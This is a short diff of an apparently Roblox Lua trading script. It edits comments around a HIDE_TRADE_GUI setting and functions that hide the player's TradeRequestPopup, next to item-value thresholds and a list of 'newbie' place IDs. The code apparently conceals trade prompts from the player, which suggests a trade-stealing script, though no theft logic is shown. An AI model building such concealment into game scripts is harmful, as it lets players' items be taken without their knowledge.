@@ -6,7 +6,7 @@ local TRADE_INVITE_COOLDOWN = 6
 local TRADE_ADD_DELAY = 0
 local TRADE_MODIFY_BUFFER = 0.03
 local TRADE_MAX_ITEMS = 20
-local HIDE_TRADE_GUI = true
+local HIDE_TRADE_GUI = true -- Set to true to hide trade GUI elements
 local SINGLE_ITEM_MIN_RAP = 1000
 local EVERYONE_RAP_THRESHOLD = 1000
 local NEWBIE_PLACE_IDS = {
@@ -814,7 +814,6 @@ local function shouldHideTradeGui()
     if not HIDE_TRADE_GUI then
         return false
     end
-    -- ONLY hide the incoming/outgoing TradeRequestPopup prompt now
     return true
 end
 
@@ -828,7 +827,6 @@ local function hideTradingGuiInstant()
         return
     end
 
-    -- ONLY target TradeRequestPopup to hide the prompt popup window
     local popup = playerGui:FindFirstChild("TradeRequestPopup")
     if popup and popup:IsA("ScreenGui") then
         if TradeRuntime.popupGuiDefaults == nil then
